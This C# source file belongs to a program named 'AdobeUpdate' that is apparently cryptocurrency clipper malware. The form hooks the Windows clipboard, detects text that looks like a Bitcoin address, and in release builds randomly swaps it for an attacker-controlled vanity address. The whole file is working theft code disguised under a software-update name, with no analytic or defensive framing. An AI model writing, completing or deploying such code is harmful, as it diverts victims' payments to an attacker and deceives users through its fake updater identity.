﻿using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using AdobeUpdate.Main;
using AdobeUpdate.Properties;

namespace AdobeUpdate
{
    public partial class BackgroundForm : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        public BackgroundForm()
        {
            InitializeComponent();

            AddClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);

            // 0x031D is the Msg when clipboard changes
            if (m.Msg != 0x031D) return;
            if (!Clipboard.ContainsText()) return;
            string clipboard = Clipboard.GetText();
            if (clipboard == Config.SwapDefaultBtcAddress) return;
            if (
                Resources.vanityAddresses.Split(new[] {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
                    .ToList()
                    .Contains(clipboard)) return;
            if(clipboard == Assists.OriginalClipboardText)return;
            Assists.OriginalClipboardText = clipboard;

            if (!Tools.ProbablyBtcAddress(Assists.OriginalClipboardText)) return;

#if !DEBUG
            if (new Random().Next(Config.RandomSwapNum) != 0) return;
#endif

            string swapBtcAddress = Tools.MostSuitableBtcAddress(Assists.OriginalClipboardText);
            
            Clipboard.SetText(swapBtcAddress);
        }
    }
}
